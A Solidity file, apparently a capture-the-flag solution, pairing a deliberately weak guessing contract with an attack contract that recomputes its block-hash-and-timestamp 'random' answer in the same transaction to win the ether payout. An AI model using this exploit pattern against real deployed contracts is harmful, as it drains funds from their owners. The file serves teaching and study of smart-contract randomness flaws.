pragma solidity ^0.4.21;

/*
interface GuessTheNewNumberChallenge {
	function guess(uint8 n) external payable;
}
*/
contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {                 
            msg.sender.transfer(2 ether);  
        }                                  
    }                                      
}                                          
                                           
contract AttackNewNumber {                 
	GuessTheNewNumberChallenge _target;
	address _owner;

	function AttackNewNumber(GuessTheNewNumberChallenge target) {
		_target = target;
		_owner = msg.sender;
	}

	function attempt(uint8 ix) external payable {
        uint8 orig = uint8(keccak256(block.blockhash(block.number - 1), now));
                                        
        /*                              
        uint8 answer = uint8((keccak256(
            abi.encodePacked(           
                blockhash(block.number - 1),
                block.timestamp)))[ix]);   
        */                                 
                                           
        _target.guess.value( 1 ether )(orig);
                                           
		/*                                 
	   if (address(this).balance == 0) {  
		   revert AttackFailed();         
	   }                                  
		 */
	}

	function() public payable {
		// yay
		// just forward any ETH thx
		//_owner.transfer(msg.value);
	}
}
